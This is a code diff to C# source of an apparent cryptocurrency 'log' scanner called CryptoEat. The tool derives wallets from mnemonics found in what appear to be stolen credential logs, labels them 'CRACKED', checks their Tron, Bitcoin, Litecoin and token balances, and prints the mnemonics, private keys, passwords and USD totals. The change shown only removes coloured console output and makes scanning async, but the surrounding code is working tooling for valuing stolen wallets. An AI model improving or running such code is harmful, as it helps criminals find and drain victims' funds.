@@ -11,7 +11,6 @@ using NBitcoin;
 using NBitcoin.Altcoins;
 using Nethereum.Util;
 using Newtonsoft.Json;
-using Pastel;
 
 namespace CryptoEat.Modules.Logs
 {
@@ -28,7 +27,7 @@ namespace CryptoEat.Modules.Logs
             _tronscan.Dispose();
         }
 
-        internal ScanResult Scan(Output account, string logPath, string pass, string prefix = "CRACKED")
+        internal async Task<ScanResult> Scan(Output account, string logPath, string pass, string prefix = "CRACKED")
         {
             var result = new ScanResult();
 
@@ -63,7 +62,7 @@ namespace CryptoEat.Modules.Logs
                 {
                     IHDWallet<TronWallet> wallet = new TronHDWallet(account.Mnemonic.ToString());
                     var address = wallet.GetAccount(0).GetExternalWallet(0).Address;
-                    var scanResult = _tronscan.CachedGetTokens(address);
+                    var scanResult = await _tronscan.CachedGetTokensAsync(address);
                     tron.Add((scanResult, address));
                 }
                 catch (Exception ex)
@@ -83,26 +82,26 @@ namespace CryptoEat.Modules.Logs
 
                 var sb = new StringBuilder();
                 sb.AppendLine();
-                sb.Append($"[{prefix.Pastel(Color.Red)}] ").AppendLine(new string('>', 49 - (prefix.Length + 1)));
+                sb.Append($"[{prefix}] ").AppendLine(new string('>', 49 - (prefix.Length + 1)));
                 sb.Append("|=| TOTAL: [")
                     .Append(
                         Math.Round(result.TotalBalance, 2).ToString(CultureInfo.CurrentCulture)
-                            .Pastel(Color.LightCoral))
+                            )
                     .AppendLine("$]");
                 if (account.Mnemonic != null)
-                    sb.Append("|=| MNEMO: [").Append(account.Mnemonic.ToString().Pastel(Color.LightCoral))
+                    sb.Append("|=| MNEMO: [").Append(account.Mnemonic.ToString())
                         .AppendLine("]");
-                sb.Append("|=| PATH: [").Append(logPath.Pastel(Color.LightCoral)).AppendLine("]");
+                sb.Append("|=| PATH: [").Append(logPath).AppendLine("]");
                 if (!string.IsNullOrWhiteSpace(pass))
-                    sb.Append("|=| PASSWORD: [").Append(pass.Pastel(Color.LightCoral)).AppendLine("]");
+                    sb.Append("|=| PASSWORD: [").Append(pass).AppendLine("]");
 
                 foreach (var (acc, tokens) in newKeys)
                 {
                     var total = tokens.Sum(x => x.Amount * (x.Price ?? 0m));
                     if (Math.Round(total, 1) == 0m) continue;
 
-                    sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
-                    sb.AppendLine($"|=| PRIVATE KEY: [{acc.PrivateKey.Pastel(Color.LightCoral)}]");
+                    sb.AppendLine("|=| |=======================================|");
+                    sb.AppendLine($"|=| PRIVATE KEY: [{acc.PrivateKey}]");
                     sb.Append(AddBalances(tokens));
                 }
 
@@ -110,7 +109,7 @@ namespace CryptoEat.Modules.Logs
                     foreach (var (tronResult, adr) in tron)
                     {
                         if (Math.Round(tronResult.TotalAssetInUsd, 1) == 0m) continue;
-                        sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
+                        sb.AppendLine("|=| |=======================================|");
                         sb.AppendLine($"|=| TRON ADDRESS: [{adr}]");
                         sb.AppendLine($"|=| TRON SUMMARY: [{Math.Round(tronResult.TotalAssetInUsd, 2)}$]");
                         sb.AppendLine($"|=| TRON ASSETS: [{tronResult.TotalTokenCount}]");
@@ -127,10 +126,10 @@ namespace CryptoEat.Modules.Logs
 
                         if (balance.Balance != "0" || balance.TotalReceived != "0")
                         {
-                            sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
-                            sb.AppendLine($"|=| BITCOIN: [{balance.Balance.Pastel(Color.LightCoral)} BTC]");
+                            sb.AppendLine("|=| |=======================================|");
+                            sb.AppendLine($"|=| BITCOIN: [{balance.Balance} BTC]");
                             sb.AppendLine(
-                                $"|=| TOTAL RECIVIED: [{balance.TotalReceived.Pastel(Color.LightCoral)} BTC]");
+                                $"|=| TOTAL RECIVIED: [{balance.TotalReceived} BTC]");
                         }
                     }
                     catch (Exception ex)
@@ -149,10 +148,10 @@ namespace CryptoEat.Modules.Logs
 
                         if (balance.Balance != "0" || balance.TotalReceived != "0")
                         {
-                            sb.AppendLine("|=| |=======================================|".Pastel(Color.Red));
-                            sb.AppendLine($"|=| LITECOIN: [{balance.Balance.Pastel(Color.LightCoral)} LTC]");
+                            sb.AppendLine("|=| |=======================================|");
+                            sb.AppendLine($"|=| LITECOIN: [{balance.Balance} LTC]");
                             sb.AppendLine(
-                                $"|=| TOTAL RECIVIED: [{balance.TotalReceived.Pastel(Color.LightCoral)} LTC]");
+                                $"|=| TOTAL RECIVIED: [{balance.TotalReceived} LTC]");
                         }
                     }
                     catch (Exception ex)
@@ -171,18 +170,18 @@ namespace CryptoEat.Modules.Logs
             {
                 var sb = new StringBuilder();
                 sb.AppendLine();
-                sb.Append($"[{prefix.Pastel(Color.Red)}] ").AppendLine(new string('>', 49 - (prefix.Length + 1)));
+                sb.Append($"[{prefix}] ").AppendLine(new string('>', 49 - (prefix.Length + 1)));
                 sb.Append("|=| TOTAL: [")
                     .Append(
                         Math.Round(result.TotalBalance, 2).ToString(CultureInfo.CurrentCulture)
-                            .Pastel(Color.LightCoral))
+                            )
                     .AppendLine("$]");
                 if (account.Mnemonic != null)
-                    sb.Append("|=| MNEMO: [").Append(account.Mnemonic.ToString().Pastel(Color.LightCoral))
+                    sb.Append("|=| MNEMO: [").Append(account.Mnemonic.ToString())
                         .AppendLine("]");
-                sb.Append("|=| PATH: [").Append(logPath.Pastel(Color.LightCoral)).AppendLine("]");
+                sb.Append("|=| PATH: [").Append(logPath).AppendLine("]");
                 if (!string.IsNullOrWhiteSpace(pass))
-                    sb.Append("|=| PASSWORD: [").Append(pass.Pastel(Color.LightCoral)).AppendLine("]");
+                    sb.Append("|=| PASSWORD: [").Append(pass).AppendLine("]");
 
                 result.LogResult = sb.ToString();
 
@@ -213,15 +212,15 @@ namespace CryptoEat.Modules.Logs
 
             foreach (var balance in balances.Where(b => b.IsWallet))
                 sb.Append("|==| CORE: ")
-                    .Append(balance.Balance.ToString(CultureInfo.CurrentCulture).Pastel(Color.LightCoral)).Append("$ [")
-                    .Append(balance.Raw.ToString().Pastel(Color.LightCoral)).Append(' ')
-                    .Append(balance.Token.Pastel(Color.Coral)).AppendLine("]");
+                    .Append(balance.Balance.ToString(CultureInfo.CurrentCulture)).Append("$ [")
+                    .Append(balance.Raw.ToString()).Append(' ')
+                    .Append(balance.Token).AppendLine("]");
             foreach (var balance in balances.Where(b => !b.IsWallet))
                 sb.Append("|==| TOKEN [")
-                    .Append(balance.Chain?.ToUpper().Pastel(Color.Coral)).Append("]: ")
-                    .Append(balance.Balance.ToString(CultureInfo.CurrentCulture).Pastel(Color.LightCoral)).Append("$ [")
-                    .Append(balance.Raw.ToString().Pastel(Color.LightCoral)).Append(' ')
-                    .Append(balance.Token.Pastel(Color.Coral)).AppendLine("]");
+                    .Append(balance.Chain?.ToUpper()).Append("]: ")
+                    .Append(balance.Balance.ToString(CultureInfo.CurrentCulture)).Append("$ [")
+                    .Append(balance.Raw.ToString()).Append(' ')
+                    .Append(balance.Token).AppendLine("]");
 
             return sb;
         }
@@ -256,14 +255,14 @@ namespace CryptoEat.Modules.Logs
                 sb.Append("|=| TOTAL: [")
                     .Append(
                         Math.Round(result.TotalBalance, 2).ToString(CultureInfo.CurrentCulture)
-                            .Pastel(Color.LightCoral))
+                            )
                     .AppendLine("$]");
-                sb.Append("|=| PATH: [").Append(logPath.Pastel(Color.LightCoral)).AppendLine("]");
+                sb.Append("|=| PATH: [").Append(logPath).AppendLine("]");
 
                 if (empty)
                 {
                     foreach (var account in accounts)
-                        sb.Append("|=| ADDRESS: [").Append(account.Address.Pastel(Color.LightCoral)).AppendLine("]");
+                        sb.Append("|=| ADDRESS: [").Append(account.Address).AppendLine("]");
 
                     sb.AppendLine("=================================================");
                     result.LogResult = sb.ToString();
@@ -276,9 +275,9 @@ namespace CryptoEat.Modules.Logs
                     if (Math.Round(total, 1) == 0m) continue;
 
                     sb.AppendLine("|=| |=======================================|");
-                    sb.Append("|=| ADDRESS: [").Append(account.Address.Pastel(Color.LightCoral)).AppendLine("]");
+                    sb.Append("|=| ADDRESS: [").Append(account.Address).AppendLine("]");
                     if (account.HardwareWallet != null)
-                        sb.AppendLine($"|=| [{account.HardwareWallet.ToUpper().Pastel(Color.Red)}]");
+                        sb.AppendLine($"|=| [{account.HardwareWallet.ToUpper()}]");
                     sb.AppendLine("|=| |=======================================|");
 
                     sb.Append(AddBalances(tokenList));
@@ -296,11 +295,11 @@ namespace CryptoEat.Modules.Logs
                 sb.Append("|=| TOTAL: [")
                     .Append(
                         Math.Round(result.TotalBalance, 2).ToString(CultureInfo.CurrentCulture)
-                            .Pastel(Color.LightCoral))
+                            )
                     .AppendLine("$]");
-                sb.Append("|=| PATH: [").Append(logPath.Pastel(Color.LightCoral)).AppendLine("]");
+                sb.Append("|=| PATH: [").Append(logPath).AppendLine("]");
                 foreach (var account in accounts)
-                    sb.Append("|=| ADDRESS: [").Append(account.Address.Pastel(Color.LightCoral)).AppendLine("]");
+                    sb.Append("|=| ADDRESS: [").Append(account.Address).AppendLine("]");
 
                 sb.AppendLine("=================================================");
                 result.LogResult = sb.ToString();
